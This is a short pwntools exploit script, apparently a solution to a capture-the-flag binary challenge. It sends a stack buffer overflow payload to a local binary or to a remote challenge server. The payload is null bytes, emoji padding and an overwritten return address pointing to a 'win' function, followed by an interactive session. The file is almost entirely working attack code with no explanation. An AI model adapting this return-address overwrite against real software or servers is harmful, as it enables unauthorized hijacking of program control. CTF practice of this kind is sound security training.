from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./chall"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("34.45.81.67", 16002)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

win = 0x40126A

payload = "😀" * 68 

payload = b"\x00"*8 + payload.encode() + p64(win)
ddebug("b *0x00401244 \n continue")
if f_remote:
    io.sendlineafter("bytes): ", payload)
else:
    io.sendline(payload)


io.interactive()
